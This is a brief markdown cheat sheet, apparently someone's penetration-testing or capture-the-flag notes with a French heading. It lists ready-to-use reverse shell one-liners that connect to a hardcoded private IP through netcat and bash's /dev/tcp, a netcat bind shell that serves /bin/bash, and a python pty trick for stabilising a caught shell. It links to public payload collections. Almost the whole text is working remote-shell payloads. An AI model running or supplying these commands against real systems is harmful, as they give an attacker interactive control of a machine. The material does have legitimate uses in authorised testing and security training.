# Bind / Reverse Shell

## Tips : 
https://www.revshells.com/  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php  

### Reverse shell basic payloads
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.225 1234 >/tmp/f
bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
```


### BIND SHELL :
***Remote***
```bash
nc -nlvp 51337 -e /bin/bash
```
***Local***
```bash
nc IP 51337
```


### STABILISER UN REVERSE SHELL
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; 
export TERM=xterm ; export SHELL=bash
```
